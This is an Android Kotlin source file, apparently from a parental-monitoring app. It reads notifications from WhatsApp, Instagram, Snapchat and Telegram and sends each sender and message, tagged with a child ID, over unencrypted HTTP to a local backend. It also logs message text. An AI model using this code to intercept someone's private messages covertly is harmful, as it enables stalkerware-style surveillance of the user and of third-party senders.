
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class ChatNotificationListener : NotificationListenerService() {

    // In apps ki notifications capture karenge
    private val targetApps = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",          // WhatsApp Business
        "com.instagram.android",
        "com.snapchat.android",
        "org.telegram.messenger",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName

        // Sirf target apps ki notifications
        if (packageName !in targetApps) return

        val extras = sbn.notification.extras

        // Message content nikaalo
        val title   = extras.getString("android.title") ?: ""
        val text    = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""

        val messageContent = bigText.ifEmpty { text }

        if (messageContent.isBlank()) return
        if (messageContent.length < 3) return   // ignore trivial

        Log.d("ChatMonitor", "App: $packageName | From: $title | Msg: $messageContent")

        // Backend pe send karo
        sendToBackend(
            appPackage = packageName,
            sender     = title,
            message    = messageContent,
        )
    }

    private fun sendToBackend(appPackage: String, sender: String, message: String) {
        val childId = getSharedPreferences("watcher_prefs", MODE_PRIVATE)
            .getInt("child_id", -1)

        if (childId == -1) return

        val appName = when (appPackage) {
            "com.whatsapp"          -> "WhatsApp"
            "com.whatsapp.w4b"      -> "WhatsApp Business"
            "com.instagram.android" -> "Instagram"
            "com.snapchat.android"  -> "Snapchat"
            "org.telegram.messenger"-> "Telegram"
            else                    -> appPackage
        }

        val json = JSONObject().apply {
            put("child_id",   childId)
            put("app_name",   appName)
            put("sender",     sender)
            put("message",    message)
            put("timestamp",  SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault()
            ).format(Date()))
        }

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val client = OkHttpClient()
                val body   = json.toString()
                    .toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url("http://192.168.18.163:8000/collectchat/")
                    .post(body)
                    .build()

                client.newCall(request).execute()

            } catch (e: Exception) {
                Log.e("ChatMonitor", "Send failed: ${e.message}")
            }
        }
    }

    
}